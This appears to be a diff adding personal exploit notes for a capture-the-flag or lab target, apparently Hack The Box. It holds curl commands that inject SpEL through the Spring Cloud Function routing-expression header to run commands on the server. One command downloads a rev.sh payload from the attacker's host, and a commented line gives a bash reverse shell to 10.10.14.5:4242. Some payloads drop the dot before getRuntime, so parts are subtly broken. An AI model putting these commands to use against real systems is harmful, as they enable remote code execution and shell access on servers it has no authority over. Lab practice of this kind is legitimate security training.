@@ -1,0 +1,11 @@
+# curl -X POST  http://10.129.184.102:8080/functionRouter -H 'spring.cloud.function.routing-expression:T(java.lang.Runtime).getRuntime().exec("touch /tmp/pwned")' --data-raw 'data' -v
+
+# bash -i >& /dev/tcp/10.10.14.5/4242 0>&1
+
+curl -X POST http://10.129.184.102:8080/functionRouter -H 'spring.cloud.function.routing-expression:T(java.lang.Runtime)getRuntime().exec("touch /tmp/fbi")' --data-raw 'data' -v
+
+curl -X POST http://10.129.184.102:8080/functionRouter -H 'spring.cloud.function.routing-expression:T(java.lang.Runtime)getRuntime().exec("curl 10.10.14.5:8000/rev.sh -o /tmp/rev.sh")' --data-raw 'data' -v
+
+
+curl -X POST  http://10.129.184.102:8080/functionRouter -H 'spring.cloud.function.routing-expression:T(java.lang.Runtime).getRuntime().exec("touch /tmp/fbi")' --data-raw 'data' -v
+curl -X POST http://10.129.184.102:8080/functionRouter -H 'spring.cloud.function.routing-expression:T(java.lang.Runtime)getRuntime().exec("curl 10.10.14.5:8000/rev.sh -o /tmp/rev.sh")' --data-raw 'data' -v
